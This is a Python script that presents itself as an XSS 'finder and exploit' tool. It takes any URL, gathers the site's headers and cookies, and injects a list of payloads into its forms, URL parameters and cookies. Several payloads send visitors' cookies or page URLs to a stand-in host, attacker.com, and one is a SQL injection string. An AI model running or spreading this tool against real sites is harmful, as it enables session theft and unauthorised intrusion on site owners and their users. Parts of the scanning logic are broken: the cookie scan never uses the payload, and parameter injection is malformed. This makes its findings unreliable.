import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import asyncio
import aiohttp
from tqdm import tqdm  # For progress bar

# Define advanced XSS payloads (with more variety)
payloads = [
    "<script>alert('XSS')</script>",  
    "\"'><img src=x onerror=alert('XSS')>",  
    "<svg/onload=alert('XSS')>",  
    "<img src='x' onerror='alert(1)'>",  
    "<iframe src='javascript:alert(1)'></iframe>",  
    "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",  
    "<script>window.location='http://attacker.com/steal?url='+window.location</script>",  
    "<script>document.write('<img src=\"http://attacker.com/cookie?cookie='+document.cookie+'\" />');</script>",  
    "<script>eval('alert(1)')</script>",  
    "a' or 1=1 --",  
    "<script>eval(atob('YWxlcnQoMSk='))</script>",  
    "<script>alert('XSS');</script>",  
    "<script>document.location='http://attacker.com?cookie=' + document.cookie</script>",  
    "<script>alert('Injected')</script>",  
    "<div onmouseover=alert(1)>mouseover XSS</div>",  
    "<img src='x' onerror='alert(document.domain)'>",  
    "<svg/onload=confirm(1)>",  
    "<script>document.body.appendChild(document.createElement('iframe')).src='http://attacker.com'</script>",  
]

# Function to check for XSS in the response
def check_xss(response, payload):
    if payload in response.text:
        return True
    return False

# Function to get detailed information about the target website (headers, cookies, etc.)
async def get_target_details(url, session):
    try:
        async with session.get(url) as response:
            response.raise_for_status()

            headers = response.headers
            cookies = response.cookies

            soup = BeautifulSoup(await response.text(), "html.parser")
            title = soup.title.string if soup.title else "No title found"
            description = ""
            for meta in soup.find_all("meta"):
                if "description" in meta.attrs.get("name", "").lower():
                    description = meta.attrs.get("content", "No description found")

            return {
                "url": url,
                "status_code": response.status,
                "title": title,
                "description": description,
                "headers": headers,
                "cookies": cookies,
            }
    except Exception as e:
        print(f"Error retrieving target details: {e}")
        return None

# Function to scan URL parameters for XSS vulnerabilities
async def scan_url_params(url, payload, session, progress_bar):
    parsed_url = urlparse(url)
    params = parsed_url.query
    if params:
        new_url = f"{url}&{payload}"
        async with session.get(new_url) as response:
            if check_xss(response, payload):
                print(f"[+] XSS Found in URL: {new_url}")
                progress_bar.update(1)

# Function to scan cookies for XSS vulnerabilities
async def scan_cookies(url, payload, session, progress_bar):
    cookies = {"session": "testcookie"}
    async with session.get(url, cookies=cookies) as response:
        if check_xss(response, payload):
            print(f"[+] XSS Found in Cookies: {url}")
            progress_bar.update(1)

# Function to scan forms and inject payloads
async def exploit_form(form_details, payload, session, progress_bar):
    data = {}
    for input_tag in form_details["inputs"]:
        if input_tag["type"] == "text":
            data[input_tag["name"]] = payload

    if form_details["method"] == "post":
        async with session.post(form_details["action"], data=data) as response:
            if check_xss(response, payload):
                print(f"[+] Exploited XSS in form: {form_details['action']} with payload: {payload}")
                progress_bar.update(1)
    else:
        async with session.get(form_details["action"], params=data) as response:
            if check_xss(response, payload):
                print(f"[+] Exploited XSS in form: {form_details['action']} with payload: {payload}")
                progress_bar.update(1)

# Main function to handle scanning and exploitation
async def bukhari_xss_finder_exploit(url):
    async with aiohttp.ClientSession() as session:
        # Retrieve target details (headers, cookies, etc.)
        target_details = await get_target_details(url, session)
        if not target_details:
            return

        print(f"\nScanning target: {target_details['url']}")
        print(f"Title: {target_details['title']}")
        print(f"Description: {target_details['description']}")
        print(f"Status Code: {target_details['status_code']}")
        print(f"Headers: {target_details['headers']}")
        print(f"Cookies: {target_details['cookies']}\n")

        # Initialize the progress bar
        progress_bar = tqdm(total=len(payloads), desc="Scanning for XSS", dynamic_ncols=True)

        tasks = []

        # Send GET request to the page
        async with session.get(url) as response:
            response.raise_for_status()
            soup = BeautifulSoup(await response.text(), "html.parser")

        # Scan forms for potential XSS injection points
        forms = soup.find_all("form")
        for form in forms:
            form_details = {}
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")
            form_details["action"] = urljoin(url, action)
            form_details["method"] = method
            form_details["inputs"] = []

            for input_tag in inputs:
                input_name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                form_details["inputs"].append({"name": input_name, "type": input_type})

            for payload in payloads:
                tasks.append(exploit_form(form_details, payload, session, progress_bar))

        # Scan URL parameters for XSS
        for payload in payloads:
            tasks.append(scan_url_params(url, payload, session, progress_bar))

        # Scan cookies for XSS
        for payload in payloads:
            tasks.append(scan_cookies(url, payload, session, progress_bar))

        # Wait for all tasks to complete
        await asyncio.gather(*tasks)

        # Close the progress bar
        progress_bar.close()

# CLI setup (no additional arguments required)
def main():
    url = input("Enter the URL of the website to scan: ").strip()

    # Run the exploit scanner
    loop = asyncio.get_event_loop()
    loop.run_until_complete(bukhari_xss_finder_exploit(url))

if __name__ == "__main__":
    main()
